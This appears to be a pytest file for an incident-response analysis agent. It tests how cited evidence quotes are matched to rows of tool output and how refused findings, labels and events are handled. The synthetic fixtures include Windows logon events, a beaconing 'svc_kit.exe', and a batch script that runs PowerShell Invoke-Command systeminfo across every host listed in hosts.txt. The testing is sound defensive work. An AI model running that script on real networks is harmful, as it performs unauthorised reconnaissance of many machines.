    assert "names no value of the row of call 12" in ap.out["dropped"][2]


def test_in_a_view_of_several_rows_shared_cells_and_a_short_piece_name_no_row(env, monkeypatch):
    rows = [_rq5_row(81, "14:05:00", 21, "Session logon succeeded for CORP\\jane.doe"),
            _rq5_row(82, "14:09:00", 24, "Session has been disconnected for CORP\\jane.doe")]
    ap, run, views = _rq5(env, monkeypatch, {13: rows})
    assert views[13]["same_in_every_returned_row"]["Computer"] == "CORP-WS02"
    kept, _q = ap._basis([{"call_id": 13, "quote": "Computer CORP-WS02 | Channel Security | 24"}], run)
    assert kept == [] and "names no one row of call 13" in ap.out["dropped"][-1]
    kept, _q = ap._basis([{"call_id": 13, "quote": "2031-03-10 14:09:00 | Computer CORP-WS02 | 24"},
                          {"call_id": 13, "quote": "Computer: CORP-WS02 | Session has been disconnected"}], run)
    assert [k["row_ref"] for k in kept] == ["13#R2", "13#R2"]


def test_the_kept_quote_is_bounded(env, monkeypatch):
    wide = dict(_RQ5_ONE, **{f"Payload{i}": f"CORP value {i} " + "y" * 110 for i in range(10)})
    ap, run, views = _rq5(env, monkeypatch, {14: [wide]})
    quote = "#1 2031-03-10 14:02:10 | " + " | ".join(f"Payload{i}: CORP value {i} yyyy" for i in range(10))
    kept, _q = ap._basis([{"call_id": 14, "quote": quote}], run)
    assert kept and len(kept[0]["quote"]) <= 600 and kept[0]["quote"].startswith("#1 2031-03-10 14:02:10 | Payload0:")


def test_a_one_row_page_of_another_call_is_re_cited(env, monkeypatch):
    other = [_rq5_row(91, "13:00:00", 4624, "An account was successfully logged on"),
             _rq5_row(92, "13:30:00", 4634, "An account was logged off")]
    ap, run, views = _rq5(env, monkeypatch, {13: other, 12: [_RQ5_ONE]})
    kept, _q = ap._basis([{"call_id": 13, "quote": "2031-03-10 14:02:10 | EventId 4688 | Process creation"}], run)
    assert [(k["call_id"], k["row_ref"], k.get("recited_from")) for k in kept] == [(12, "12#R1", 13)]


def test_a_header_or_count_line_is_named_as_one_and_never_kept(env, monkeypatch):
    count = {"success": True, "pattern": "svc_kit",
             "counted": "counted in 2 tables: exports/corp-ws01-security.csv: 3, exports/corp-ws02-security.csv: 0",
             "counts": [{"path": "exports/corp-ws01-security.csv", "matched_rows": 3},
                        {"path": "exports/corp-ws02-security.csv", "matched_rows": 0}],
             "note": "counts only, complete; no rows are returned for a count across tables"}
    zero = {"success": True, "path": "exports/corp-ws01-security.csv", "pattern": "svc_kit", "matched_rows": 0,
            "returned_rows": 0, "hit_count": 0, "hits": []}
    extra = {41: {"type": "tool_call", "cmd": "<py>:table_table_grep", "stdout_excerpt": json.dumps(count),
                  "args": json.dumps({"path": "exports/corp-ws01-security.csv", "pattern": "svc_kit",
                                      "sources": ["exports/corp-ws02-security.csv"]})},
             42: {"type": "tool_call", "cmd": "<py>:table_table_grep", "stdout_excerpt": json.dumps(zero),
                  "args": json.dumps({"path": "exports/corp-ws01-security.csv", "pattern": "svc_kit"})}}
    ap, run, views = _rq5(env, monkeypatch, {13: [_rq5_row(81, "14:05:00", 21, "Session logon succeeded"),
                                                 _rq5_row(82, "14:09:00", 24, "Session disconnected")]}, extra)
    kept, _q = ap._basis([{"call_id": 41, "quote": "counted in 2 tables: exports/corp-ws01-security.csv: 3"},
                          {"call_id": 42, "quote": '"matched_rows": 0'},
                          {"call_id": 42, "quote": "'matched_rows': 0"},
                          {"call_id": 13, "quote": '"returned_rows": 2'},
                          {"call_id": 42, "quote": "svc_kit.exe ran on CORP-WS01"}], run)
    assert kept == []
    d = ap.out["dropped"]
    assert "a count across tables names no row; grep one table without sources for its rows" in d[0]
    for why in d[1:3]:
        assert ("call 42 returned no row; a count names none: put call 42 in examined for what it did not find, or "
                "cite a row of a call that returned one") in why
    assert "is a line of call 13's header" in d[3] and "is not in call 42's output" in d[4]


def test_a_one_row_quote_whose_time_a_shared_cell_repeats_still_names_its_row(env, monkeypatch):
    row = _rq5_row(79, "14:22:12", 11, "File created", PayloadData1="TargetFilename: C:\\Users\\Public\\out.7z",
                   PayloadData2="CreationUtcTime: 2031-03-10 14:22:12")
    ap, run, views = _rq5(env, monkeypatch, {18: [row]})
    kept, _q = ap._basis([{"call_id": 18, "quote": "#1 2031-03-10 14:22:12 | EventId 11 | File created"}], run)
    assert [k["row_ref"] for k in kept] == ["18#R1"]


def test_a_quote_of_shared_values_takes_the_shared_path_whatever_a_line_repeats(env, monkeypatch):
    plain = [_rq5_row(81, "14:05:00", 21, "Session logon succeeded for CORP\\jane.doe"),
             _rq5_row(82, "14:09:00", 24, "Session has been disconnected for CORP\\jane.doe")]
    named = [_rq5_row(81, "14:05:00", 21, "Session logon succeeded on CORP-WS02 for CORP\\jane.doe"),
             _rq5_row(82, "14:09:00", 24, "Session has been disconnected for CORP\\jane.doe")]
    results = []
    for rows in (plain, named):
        ap, run, views = _rq5(env, monkeypatch, {13: rows})
        kept, _q = ap._basis([{"call_id": 13, "quote": "Computer CORP-WS02 | Channel Security"}], run)
        results.append([k["row_ref"] for k in kept])
    assert results[0] == results[1] and results[0]          # the same answer whether a line repeats the host or not
    # the shared values with a part that tells one line apart: that line
    ap, run, views = _rq5(env, monkeypatch, {13: named})
    kept, _q = ap._basis([{"call_id": 13, "quote": "Computer CORP-WS02 | Channel Security | 2031-03-10 14:09:00"},
                          {"call_id": 13, "quote": "Computer CORP-WS02 | Session logon succeeded on CORP-WS02"}], run)
    assert [k["row_ref"] for k in kept] == ["13#R2", "13#R1"]


def test_a_bare_quote_of_shared_values_is_never_refused(env, monkeypatch):
    named = [_rq5_row(81, "14:05:00", 21, "Session logon succeeded on CORP-WS02 for CORP\\jane.doe"),
             _rq5_row(82, "14:09:00", 24, "Session has been disconnected for CORP\\jane.doe")]
    plain = [_rq5_row(81, "14:05:00", 21, "Session logon succeeded for CORP\\jane.doe"), named[1]]
    for rows, ref in ((named, "13#R1"), (plain, None)):
        ap, run, views = _rq5(env, monkeypatch, {13: rows})
        kept, _q = ap._basis([{"call_id": 13, "quote": "CORP-WS02 | Security"}], run)
        assert kept and not ap.out["dropped"]
        if ref:
            assert [k["row_ref"] for k in kept] == [ref]                   # the one line its parts tell apart


def test_a_column_named_with_another_columns_value_is_told_which_column_holds_it(env, monkeypatch):
    rows = [_rq5_row(81, "14:05:00", 21, "Session logon succeeded"), _rq5_row(82, "14:09:00", 24, "Session ended")]
    for pages in ({13: rows}, {12: [_RQ5_ONE]}):
        ap, run, views = _rq5(env, monkeypatch, pages)
        cid = next(iter(pages))
        kept, _q = ap._basis([{"call_id": cid, "quote": "Channel CORP-WS02"}], run)
        assert kept == []
        assert f"names Channel of call {cid}: Channel shows 'Security'; 'CORP-WS02' is under Computer" in \
            ap.out["dropped"][-1]


# -- every call of the item is its own; text read in another call of the item is found there ----

def test_the_head_stamp_is_the_results_id_and_no_call_id_of_its_content_wins():
    from core.call_memo import trace_call_id_of
    result = json.dumps({"_atlas_call_id": 9, "success": True, "call_id": 4, "claims": [{"call_id": 5}],
                         "note": "x" * 900, "tail": {"_atlas_call_id": 6}}, indent=2)
    assert trace_call_id_of(result) == "9"
    assert trace_call_id_of("[replayed from turn 3: identical call; its result had been compacted out of the "
                            "conversation.]\n" + result) == "9"          # the memo's replay keeps the original stamp
    assert trace_call_id_of('{"stdout": "' + "y" * 900 + '", "_atlas_call_id": 7}') == "7"   # an executor's tail


def _reads(env, monkeypatch, outputs, others=None):
    """Calls of one item: an extraction that wrote files ("Output written to"), and reads of them (a JSON list of
    lines); ``others``: calls of other items."""
    case, trace, m = env
    entries = {cid: {"type": "tool_call", "cmd": "<py>:strings_read_text" if isinstance(out, list) else "icat",
                     "stdout_excerpt": json.dumps({"success": True, "path": f"analysis/f{cid}.bat", "lines": out})
                     if isinstance(out, list) else out} for cid, out in {**outputs, **(others or {})}.items()}
    monkeypatch.setattr(IM.IncidentMap, "_entry", staticmethod(lambda cid: entries.get(int(cid))))
    monkeypatch.setattr("core.execution_log.log", SimpleNamespace(
        index=lambda: SimpleNamespace(by_call_id=entries)))
    ap = SubmitApplier(_Agent([]), case, m, _item(trace), "join_hit")
    return ap, SimpleNamespace(calls=list(outputs), seen={})


_SCRIPT = ["@echo off", "", 'for /f "tokens=*" %%A in (hosts.txt) do collect.bat %%A',
           'powershell -command "Invoke-Command {systeminfo} -ComputerName %1" >> c:\\windows\\temp\\%1.txt']


def test_a_line_read_in_another_call_of_the_item_is_re_cited_there(env, monkeypatch):
    ap, run = _reads(env, monkeypatch, {70: "Output written to analysis/f71.bat", 71: _SCRIPT})
    quote = _SCRIPT[3]
    kept, _q = ap._basis([{"call_id": 70, "quote": quote}, {"call_id": 71, "quote": _SCRIPT[2]}], run)
    assert [(k["call_id"], k["row_ref"], k.get("recited_from")) for k in kept] == [(71, "71#R4", 70), (71, "71#R3", None)]
    assert ap.m.row_text("71#R4") == quote                      # quotes and backslashes: the row itself


def test_a_short_or_shared_line_is_never_re_cited(env, monkeypatch):
    ap, run = _reads(env, monkeypatch, {70: "Output written to analysis/f71.bat", 71: _SCRIPT})
    kept, _q = ap._basis([{"call_id": 70, "quote": "@echo off"}], run)
    assert kept == [] and "it is in call 71: quote more of the line, enough to name it" in ap.out["dropped"][-1]
    ap, run = _reads(env, monkeypatch, {70: "Output written to analysis/f71.bat", 71: _SCRIPT, 72: _SCRIPT})
    kept, _q = ap._basis([{"call_id": 70, "quote": "@echo off"}, {"call_id": 70, "quote": _SCRIPT[2]}], run)
    assert kept == [] and "it is in call 71, call 72" in ap.out["dropped"][0]
    assert "it is in call 71, call 72: cite the call it is in" in ap.out["dropped"][1]


def test_a_line_another_item_read_is_named_and_a_shown_side_refusal_stands(env, monkeypatch):
    ap, run = _reads(env, monkeypatch, {70: "Output written to analysis/f71.bat"}, others={88: _SCRIPT})
    kept, _q = ap._basis([{"call_id": 70, "quote": _SCRIPT[2]}], run)
    assert kept == [] and "it is in call 88 of another item: read it in this item to cite it" in ap.out["dropped"][-1]
    # a numbered view's own refusal is never overridden by a call that holds the text
    ap, run, rows = _rq1(env, monkeypatch)
    kept, _q = ap._basis([{"call_id": 61, "quote": "2031-03-10 13:58:02 | EVT/WinEVTX"}], run)
    assert kept == [] and "is in 2 rows of call 61" in ap.out["dropped"][-1]


def test_an_old_line_ref_still_reads_its_line(env, monkeypatch):
    ap, run = _reads(env, monkeypatch, {71: _SCRIPT})
    assert ap.m.row_text("71#L1").startswith('{"success": true')    # the saved output's first line
    assert ap.m.row_ref_for(71, "collect.bat %%A") == "71#R3"         # the place among the read's lines


def test_a_view_time_without_a_date_tells_a_line_apart_only_with_the_whole_quote(env, monkeypatch):
    from core.tool_result_view import render_rows_view
    case, trace, m = env
    rows = [{"_sheet": "-", "_row": 61, "time": "22:50:00", "type": "Last Access Time", "user": "jane.doe",
             "desc": "c:\\Tools\\hosts.txt"},
            {"_sheet": "-", "_row": 64, "time": "22:52:14", "type": "Last Access Time", "user": "john.roe",
             "desc": "c:\\Tools\\hosts.txt"},
            {"_sheet": "-", "_row": 65, "time": "22:52:14", "type": "Last Access Time", "user": "ann.poe",
             "desc": "c:\\Tools\\other.txt"}]
    payload = {"success": True, "rows": rows}
    text, note = render_rows_view({"_atlas_call_id": 46, **payload}, 12000, 46, tool="table_table_query")
    view = json.loads(text)
    assert view["columns"].startswith("time") and any(r.startswith("#2 22:52:14 |") for r in view["rows"])
    entries = {46: {"type": "tool_call", "stdout_excerpt": json.dumps(payload), **note}}
    monkeypatch.setattr(IM.IncidentMap, "_entry", staticmethod(lambda cid: entries.get(int(cid))))
    ap = SubmitApplier(_Agent([]), case, m, _item(trace), "join_hit")
    run = SimpleNamespace(calls=[46], seen={46: text})
    kept, _q = ap._basis([{"call_id": 46, "quote": "#2 22:52:14 | c:\\Tools\\hosts.txt"},
                          {"call_id": 46, "quote": "22:52:14 | c:\\Tools\\hosts.txt"}], run)
    assert [k["row_ref"] for k in kept] == ["46#R2", "46#R2"]
    kept, _q = ap._basis([{"call_id": 46, "quote": "22:52:14 | Last Access Time"}], run)   # two lines hold it
    assert kept == [] and "is in 2 rows of call 46" in ap.out["dropped"][-1]


def test_the_other_item_lookup_reads_each_output_once_per_submit_and_an_unreadable_one_is_passed_over(env,
                                                                                                       monkeypatch):
    import core.indicators as I
    ap, run = _reads(env, monkeypatch, {70: "Output written to analysis/f71.bat"},
                     others={88: _SCRIPT, 89: ["unrelated line of another read"]})
    real, reads = I._output_text, []

    def counted(entry, limit):
        reads.append(entry)
        if entry.get("stdout_excerpt", "").startswith('{"success": true, "path": "analysis/f89'):
            raise OSError("unreadable output")
        return real(entry, limit)
    monkeypatch.setattr(I, "_output_text", counted)
    ap({"observations": [{"text": "a", "basis": [{"call_id": 70, "quote": _SCRIPT[2]},
                                                {"call_id": 70, "quote": _SCRIPT[3]}]}]}, run, False)
    whys = [d for d in ap.out["dropped"] if "of another item" in d]
    assert len(whys) == 2 and all("it is in call 88 of another item" in w for w in whys)
    assert len([e for e in reads if e.get("cmd") == "<py>:strings_read_text"]) == 2       # 88 and 89, once each
    # a lookup that fails as a whole gives the plain refusal, never an error
    monkeypatch.setattr(IM.IncidentMap, "row_refs_for", lambda self, c, q: (_ for _ in ()).throw(ValueError("odd")))
    monkeypatch.setattr(IM.IncidentMap, "call_holding", lambda self, *a: (_ for _ in ()).throw(ValueError("odd")))
    kept, _q = ap._basis([{"call_id": 70, "quote": _SCRIPT[2]}], run)
    assert kept == [] and ap.out["dropped"][-1] == f"the quote {_SCRIPT[2][:60]!r} is not in call 70's output"


def test_findings_refused_twice_by_one_gate_in_one_item_share_one_followup_and_a_repeat_joins_it(env):
    """One refusal followup per item and gate, listing its findings; a finding refused again (here, or in
    another item) returns the item that holds it, never a new one."""
    case, log, m = env
    refusal = {"success": False, "gate": "evidence_strength", "error": "cite the row"}
    second = {**_FINDING, "statement": "svc_kit.exe beaconed to 203.0.113.7 from CORP-WS01 at 2031-03-10 14:05:00."}
    ap = SubmitApplier(_Agent([refusal] * 4), case, m, _item(log), "join_hit")
    ap({"findings": [_FINDING, second]}, _run(), False)
    ap({"findings": [_FINDING, second]}, _run(), False)
    follow = [i for i in log.work_items() if i["origin"] == "followup"]
    assert len(follow) == 1 and len(follow[0]["source_ref"]["refused"]) == 2
    assert follow[0]["why"].startswith("2 findings refused twice by evidence_strength")
    other = SubmitApplier(_Agent([refusal] * 2), case, m, _item(log, host="CORP-WS02"), "join_hit")
    other({"findings": [second]}, _run(), False)
    other({"findings": [second]}, _run(), False)
    assert len([i for i in log.work_items() if i["origin"] == "followup"]) == 1


# -- a resent submit's findings repair the refused entries by identity, never by position -------

def _rq9_findings():
    fs = []
    for i in range(11):
        cid, quote = (12, "logon from 203.0.113.7") if i in (2, 6) else (11, "jane.doe,C:\\Users\\Public\\svc_kit.exe")
        fs.append({"statement": f"finding {i + 1}: svc_kit.exe activity on CORP-WS01 seen as step {i + 1}.",
                   "host": "CORP-WS01", "confidence": "likely", "bears_on": ["task-0001/p1"],
                   "basis": [{"call_id": cid, "quote": quote}],
                   "entities": [{"kind": "endpoint" if i in (2, 6) else "file",
                                 "value": "203.0.113.7" if i in (2, 6) else "C:\\Users\\Public\\svc_kit.exe"}]})
    return fs


_RQ9_EVENT = {"host": "CORP-WS02", "time": "2031-03-10 13:58:00", "kind": "logon",
              "src": {"kind": "endpoint", "value": "203.0.113.7"},
              "basis": [{"call_id": 12, "quote": "logon from 203.0.113.7"}]}
_RQ9_LABEL = {"ref": {"kind": "host", "value": "CORP-WS02"}, "label": "attacker",
              "attacker_from": "2031-03-10 13:58:00", "basis": [{"call_id": 12, "quote": "logon from 203.0.113.7"}]}


def _rq9_ap(env, second):
    case, log, m = env
    ok = {"success": True, "claim_id": "C0001"}
    no = {"success": False, "gate": "evidence_strength", "error": "cite the row"}
    first = [ok if i not in (2, 6) else no for i in range(11)]
    agent = _Agent(first + second)
    return SubmitApplier(agent, case, m, _item(log), "join_hit"), agent


def test_a_whole_resend_never_releases_a_refused_findings_labels_or_events_through_another(env, monkeypatch):
    case, log, m = env
    fs = _rq9_findings()
    no = {"success": False, "gate": "evidence_strength", "error": "cite the row"}
    ap, agent = _rq9_ap(env, [no, no])
    monkeypatch.setattr(SubmitApplier, "_record", lambda self, f, basis, quotes, rows: (
        ("", "", f"C{len(agent.records) + 1:04d}") if agent.replies.pop(0).get("success") else
        ("evidence_strength", "cite the row", "")) if not agent.records.append(f) else None)
    assert ap({"findings": fs, "labels": [_RQ9_LABEL], "events": [_RQ9_EVENT]}, _run(), False)
    assert sorted(p["index"] for p in ap.pending) == [3, 7]
    held = [p for p in ap.pending if p.get("events") or p.get("deferred_labels")]
    assert held and held[0]["index"] == 3                      # f3 holds the event and the host label
    reply = ap({"findings": fs}, _run(), False)                # all 11 resent
    # f1, f2 ... are already recorded: skipped, so they release nothing of f3 or f7
    assert reply is None
    with m._read() as con:
        written = con.execute("SELECT COUNT(*) FROM events").fetchone()[0]
        host_attacker = con.execute("SELECT COUNT(*) FROM labels l JOIN entities n ON 'e:' || n.eid = l.target "
                                    "WHERE n.kind = 'host' AND l.label = 'attacker' AND l.current = 1").fetchone()[0]
    assert host_attacker == 0                                  # f3's label never passed f3's gates
    assert written <= 1 and not any(e["value"] == "CORP-WS02" for e in m.attacker_entities())
    # the second refusal of f3 and of f7 is their second: refused twice, each a followup
    follow = [i for i in log.work_items() if i["origin"] == "followup"]
    assert len(follow) == 1 and len(follow[0]["source_ref"]["refused"]) == 2
    assert [len(agent.records)] == [13]                        # 11 + the two repairs, no re-record of the rest


def _scripted(agent, monkeypatch):
    monkeypatch.setattr(SubmitApplier, "_record", lambda self, f, basis, quotes, rows: (
        ("", "", f"C{len(agent.records) + 1:04d}") if agent.replies.pop(0).get("success") else
        ("evidence_strength", "cite the row", "")) if not agent.records.append(f) else None)


def _f3_out(m, log):
    """Nothing of f3 reached the map as the attacker's, and f3 ended refused twice."""
    with m._read() as con:
        attacker = con.execute("SELECT COUNT(*) FROM labels WHERE label = 'attacker' AND current = 1").fetchone()[0]
    follow = [i for i in log.work_items() if i["origin"] == "followup"]
    return attacker == 0 and len(follow) == 1 and any(
        "203.0.113.7" in r["why"] for r in follow[0]["source_ref"]["refused"])


def test_a_reworded_refused_finding_is_judged_as_new_and_the_old_one_ends_refused_twice(env, monkeypatch):
    case, log, m = env
    fs = _rq9_findings()
    ok, no = {"success": True}, {"success": False}
    agent = _Agent([ok, ok, no, no])
    ap = SubmitApplier(agent, case, m, _item(log), "join_hit")
    _scripted(agent, monkeypatch)
    ap({"findings": fs[:3], "labels": [_RQ9_LABEL], "events": [_RQ9_EVENT]}, _run(), False)
    assert [p["index"] for p in ap.pending] == [3]
    reworded = {**fs[2], "statement": "The logon from 203.0.113.7 at 13:58 opened the session."}
    assert ap({"findings": [reworded]}, _run(), False)          # refused as new: one more repair
    assert len(ap.pending) == 2                                  # the old entry stays, never released
    ap.finish()
    assert _f3_out(m, log)


def test_an_observation_resent_before_a_reworded_repair_never_takes_its_entry(env, monkeypatch):
    case, log, m = env
    fs = _rq9_findings()
    ok, no = {"success": True}, {"success": False}
    agent = _Agent([ok, no, no])
    ap = SubmitApplier(agent, case, m, _item(log), "join_hit")
    _scripted(agent, monkeypatch)
    # kept as an observation: it names no part and holds no labelled value, and cites f3's call
    seen = {"statement": "A logon from 203.0.113.7 is in the table.", "host": "CORP-WS01", "bears_on": [],
            "basis": [{"call_id": 12, "quote": "logon from 203.0.113.7"}],
            "entities": [{"kind": "endpoint", "value": "203.0.113.7"}]}
    ap({"findings": [fs[0], seen, fs[2]], "labels": [_RQ9_LABEL], "events": [_RQ9_EVENT]}, _run(), False)
    assert [p["index"] for p in ap.pending] == [3]
    reworded = {**fs[2], "statement": "The logon from 203.0.113.7 at 13:58 opened the session."}
    ap({"findings": [fs[0], seen, reworded]}, _run(), False)
    ap.finish()
    assert _f3_out(m, log)


def test_a_new_finding_that_shares_a_call_never_takes_a_refused_entry(env, monkeypatch):
    case, log, m = env
    fs = _rq9_findings()
    ok, no = {"success": True}, {"success": False}
    agent = _Agent([ok, no, ok, no])
    ap = SubmitApplier(agent, case, m, _item(log), "join_hit")
    _scripted(agent, monkeypatch)
    ap({"findings": [fs[0], fs[2]], "labels": [_RQ9_LABEL], "events": [_RQ9_EVENT]}, _run(), False)
    new = {**fs[6], "statement": "A second logon from 203.0.113.7 reached CORP-WS01."}
    reworded = {**fs[2], "statement": "The logon from 203.0.113.7 at 13:58 opened the session."}
    ap({"findings": [new, reworded]}, _run(), False)
    assert len(agent.records) == 4                               # the new one recorded on its own pool
    ap.finish()
    assert _f3_out(m, log)


def test_an_empty_statement_pairs_with_no_refused_entry(env, monkeypatch):
    case, log, m = env
    fs = _rq9_findings()
    ok, no = {"success": True}, {"success": False}
    agent = _Agent([ok, no, ok])
    ap = SubmitApplier(agent, case, m, _item(log), "join_hit")
    _scripted(agent, monkeypatch)
    ap({"findings": [fs[0], {**fs[2], "statement": ""}], "labels": [_RQ9_LABEL], "events": [_RQ9_EVENT]},
       _run(), False)
    ap({"findings": [{**fs[6], "statement": "  "}]}, _run(), False)
    assert [p["index"] for p in ap.pending] == [2]               # the empty one is still its own
    with m._read() as con:
        assert con.execute("SELECT COUNT(*) FROM labels WHERE label = 'attacker' AND current = 1"
                           ).fetchone()[0] == 0


def test_a_resent_recorded_finding_with_a_changed_tier_says_the_change_was_not_applied(env, monkeypatch):
    case, log, m = env
    fs = _rq9_findings()
    agent = _Agent([{"success": True}])
    ap = SubmitApplier(agent, case, m, _item(log), "join_hit")
    _scripted(agent, monkeypatch)
    ap({"findings": [fs[0]], "partial": True}, _run(), False)
    same = ap({"findings": [fs[0]], "partial": True}, _run(), False)
    assert "already recorded" in same and "not applied" not in same
    raised = ap({"findings": [{**fs[0], "confidence": "confirmed"}], "partial": True}, _run(), False)
    assert "already recorded; its changed tier or bears_on was not applied" in raised
    assert len(agent.records) == 1


# -- one frontier_submit record per submit, with each finding's outcome and each label's route --------

def _logged(agent):
    agent.log = []
    agent._log = agent.log.append
    return lambda event: [r for r in agent.log if r.get("event") == event]


def _held_f3(env, monkeypatch, replies):
    case, log, m = env
    agent = _Agent(replies)
    ap = SubmitApplier(agent, case, m, _item(log), "join_hit")
    _scripted(agent, monkeypatch)
    return ap, agent, _logged(agent)


def _map_text(m):
    """Every row of every table of the map, as text."""
    with m._read() as con:
        names = [r[0] for r in con.execute("SELECT name FROM sqlite_master WHERE type = 'table'")]
        return json.dumps({n: [list(r) for r in con.execute(f"SELECT * FROM {n}")] for n in names}, default=str)


def test_a_submit_logs_its_size_each_findings_outcome_and_what_it_held(env, monkeypatch):
    fs = _rq9_findings()
    ap, agent, recs = _held_f3(env, monkeypatch, [{"success": True}, {"success": False}])
    seen = {"statement": "A logon from 203.0.113.7 is in the table. " * 20, "host": "CORP-WS01", "bears_on": [],
            "basis": [{"call_id": 12, "quote": "logon from 203.0.113.7"}],
            "entities": [{"kind": "endpoint", "value": "203.0.113.7"}]}
    ap({"findings": [fs[0], seen, fs[2]], "labels": [_RQ9_LABEL], "events": [_RQ9_EVENT]}, _run(), False)
    [r] = recs("frontier_submit")
    assert r["submit"] == 1 and not r["repair"] and r["args_chars"] > 1000 and r["reply_none"] is False
    assert (r["findings_sent"], r["labels_sent"], r["events_sent"]) == (3, 1, 1)
    assert [f["outcome"] for f in r["findings"]] == ["recorded", "observation", "refused"]
    assert r["findings"][0]["claim"] and r["findings"][2]["gate"] == "evidence_strength"
    assert len(r["findings"][1]["said"]) <= 200 and r["findings"][2]["basis"] == r["findings"][2]["kept"] == 1
    # the host label shares only f3's call; the event holds f3's endpoint
    assert r["labels"] == [{"ref": "host:corp-ws02", "label": "attacker", "outcome": "held", "on": "1:3",
                            "held_by": "call"}]
    assert [(e["outcome"], e["on"], e["held_by"]) for e in r["events"]] == [("held", "1:3", "entity")]


def test_a_repaired_finding_logs_the_route_of_what_it_releases(env, monkeypatch):
    fs = _rq9_findings()
    ap, agent, recs = _held_f3(env, monkeypatch, [{"success": True}, {"success": False}, {"success": True}])
    ap({"findings": [fs[0], fs[2]], "labels": [_RQ9_LABEL], "events": [_RQ9_EVENT]}, _run(), False)
    assert ap({"findings": [fs[2]]}, _run(), False) is None
    r = recs("frontier_submit")[-1]
    assert r["submit"] == 2 and r["repair"] and r["reply_none"]
    assert [(f["n"], f["repairs"], f["outcome"]) for f in r["findings"]] == [(1, "1:2", "recorded")]
    [lab] = r["labels"]
    assert (lab["outcome"], lab["held_for"], lab["through"]) == ("released", "1:2", "2:1")
    assert lab["claim"] == r["findings"][0]["claim"]
    assert [(e["outcome"], e["held_for"], e["through"]) for e in r["events"]] == [("released", "1:2", "2:1")]


def test_a_whole_resend_releases_only_through_an_equal_statement_and_closes_the_reworded_ones_entry(env, monkeypatch):
    case, log, m = env
    fs = _rq9_findings()
    ok, no = {"success": True}, {"success": False}
    ap, agent, recs = _held_f3(env, monkeypatch, [ok, no, no, ok, no])
    acct = {"statement": "jane.doe ran svc_kit.exe on CORP-WS01.", "host": "CORP-WS01", "confidence": "likely",
            "bears_on": ["task-0001/p1"], "basis": [{"call_id": 11, "quote": "jane.doe,C:\\Users\\Public\\svc_kit.exe"}],
            "entities": [{"kind": "account", "value": "jane.doe"}]}
    acct_label = {"ref": {"kind": "account", "value": "jane.doe"}, "label": "attacker",
                  "basis": [{"call_id": 11, "quote": "jane.doe"}]}
    ap({"findings": [fs[0], fs[2], acct], "labels": [_RQ9_LABEL, acct_label], "events": [_RQ9_EVENT]},
       _run(), False)
    first = recs("frontier_submit")[0]
    assert [(x["ref"], x["on"], x["held_by"]) for x in first["labels"]] == [
        ("host:corp-ws02", "1:2", "call"), ("account:jane.doe", "1:3", "entity")]
    reworded = {**acct, "statement": "The account jane.doe started svc_kit.exe."}
    ap({"findings": [fs[0], fs[2], reworded]}, _run(), False)          # the whole submit again
    r = recs("frontier_submit")[-1]
    assert [(f["outcome"], f["repairs"]) for f in r["findings"]] == [
        ("already_recorded", ""), ("recorded", "1:2"), ("refused", "")]  # the reworded one is new
    assert [(x["ref"], x["outcome"], x["held_for"], x["through"]) for x in r["labels"]] == [
        ("host:corp-ws02", "released", "1:2", "2:2")]
    ap.finish()
    [c] = recs("frontier_submit_close")
    assert ("account:jane.doe", "unknown_refused_twice", "1:3", "1:3") in [
        (x["ref"], x["outcome"], x["held_for"], x["through"]) for x in c["labels"]]


def _snapshot(tmp_path, monkeypatch, mode):
    tmp_path.mkdir()
    case, log, m = _env(tmp_path, monkeypatch)
    fs = _rq9_findings()
    agent = _Agent([{"success": True}, {"success": False}])
    ap = SubmitApplier(agent, case, m, _item(log), "join_hit")
    _scripted(agent, monkeypatch)
    _logged(agent)
    if mode == "raising":
        def boom(rec):
            if str(rec.get("event", "")).startswith("frontier_submit"):
                raise RuntimeError("the transcript is gone")
        agent._log = boom
    args = {"findings": [fs[0], fs[2]], "labels": [_RQ9_LABEL], "events": [_RQ9_EVENT]}
    if mode == "unencodable":
        args[("not", "a", "string", "key")] = 1                       # json.dumps refuses it, default or not
    reply = ap(args, _run(), False)
    ap.finish()
    with m._read() as con:
        state = [list(r) for r in con.execute("SELECT target, label, current FROM labels ORDER BY target, label")]
        events = con.execute("SELECT COUNT(*) FROM events").fetchone()[0]
    follow = [(i["origin"], i["status"]) for i in log.work_items()]
    return reply, [p["index"] for p in ap.pending], state, events, follow, ap, agent, m, args


def test_a_record_that_cannot_be_written_never_touches_the_submit_and_no_hold_tag_leaves_it(tmp_path, monkeypatch):
    plain = _snapshot(tmp_path / "plain", monkeypatch, "plain")
    for mode in ("raising", "unencodable"):
        got = _snapshot(tmp_path / mode, monkeypatch, mode)
        assert got[:5] == plain[:5], mode
    reply, pending, state, events, follow, ap, agent, m, args = plain
    assert "finding 2 refused (evidence_strength)" in reply and events == 1
    recs = [r for r in agent.log if r.get("event") == "frontier_submit_close"]
    assert recs and [x["outcome"] for x in recs[0]["labels"] + recs[0]["events"]] == ["unknown_refused_twice"] * 2
    unenc = [r for r in got[6].log if r.get("event") == "frontier_submit"]
    assert unenc and unenc[0]["args_chars"] == -1 and unenc[0]["findings_sent"] == 2
    # the hold notes stay beside the dicts: nothing in the map, the claims, the item's out or the submit
    for where in (_map_text(m), json.dumps(agent.records, default=str), json.dumps(ap.out, default=str),
                  json.dumps(args, default=str)):
        assert "_held" not in where and "held_by" not in where
